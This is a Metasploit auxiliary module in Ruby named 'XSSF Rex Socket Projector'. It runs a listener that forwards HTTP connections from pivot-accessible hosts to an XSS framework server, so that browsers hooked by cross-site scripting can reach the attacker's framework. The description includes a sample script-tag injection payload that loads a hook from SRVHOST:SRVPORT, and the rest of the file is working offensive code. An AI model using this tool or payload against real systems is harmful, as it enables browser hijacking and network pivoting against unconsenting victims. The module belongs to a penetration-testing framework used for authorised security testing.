##
# $Id$
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Exploit::Remote::HttpClient
	include Exploit::Remote::HttpServer

	def initialize
		super(
			'Name'        => 'XSSF Rex Socket Projector',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module creates a rex socket to any local or pivot accessible
				host which forwards http connections to the XSSF server running on 
				localhost. By injecting something like '<script type="text/javascript" 
				src="http://SRVHOST:SRVPORT/loop?interval=5"></script>' into
				a page/response, XSSF can be hooked to a machine without direct
				access to the MSF host.
			},
			'Author'      => 'RageLtMan',
			'License'     => MSF_LICENSE
		)

		deregister_options('RPORT', 'RHOST', 'URI', 'URIPATH')

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "Listener port", 80 ]),
				OptAddress.new('SRVHOST', [ true, "Listener Socket Address", "0.0.0.0" ]),
			], self.class)

		#
		datastore['RPORT'] = 8888
		datastore['RHOST'] = '127.0.0.1'
		datastore['URIPATH'] = '/'
	end


	def run
		start_service
		while !completed?
			Rex::ThreadSafe.sleep(2)
		end
	end
	alias_method :exploit, :run

	def on_request_uri(cli, req)
		vprint_good("Client #{cli.peerinfo} connected")
		# Rewrite or target host
		headers = req.headers.dup
		headers['Host'] = "#{datastore['RHOST']}:#{datastore['RPORT']}"

		# Setup the request headers
		headers['Method'] = req.method
		headers['Uri'] = req.uri

		# Get response and return to client
		res = send_request_raw(headers,20)
		send_response(cli, res.body, res.headers)
	end

	def completed?
		false
	end

end

